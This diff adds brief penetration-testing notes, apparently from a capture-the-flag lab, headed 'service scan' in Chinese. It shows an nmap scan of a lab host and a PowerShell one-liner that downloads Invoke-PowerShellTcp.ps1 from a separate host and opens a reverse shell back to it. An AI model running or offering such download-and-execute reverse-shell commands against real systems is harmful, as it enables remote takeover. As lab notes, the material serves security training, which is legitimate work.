@@ -1,0 +1,19 @@
+#服务扫描
+─# nmap -sT -Pn 10.10.26.252
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-23 05:52 EDT
+Nmap scan report for 10.10.26.252
+Host is up (0.32s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 19.05 seconds
+
+
+
+
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.13.21.169:4443/ Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.13.21.169 -Port 4443
